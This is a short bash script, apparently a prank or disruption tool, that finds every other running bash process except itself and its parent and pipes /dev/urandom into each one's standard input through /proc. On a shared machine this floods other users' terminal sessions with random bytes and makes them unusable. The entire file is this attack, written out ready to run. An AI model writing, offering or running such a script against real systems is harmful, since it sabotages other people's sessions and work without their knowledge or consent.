#!/bin/bash

for i in $(ps aux | grep bash | grep -v grep | grep -v $0 |  awk '{ print $2 }'); do
	if [ $i -ne $PPID ]; then
		cat /dev/urandom > /proc/${i}/fd/0 &
	fi
done
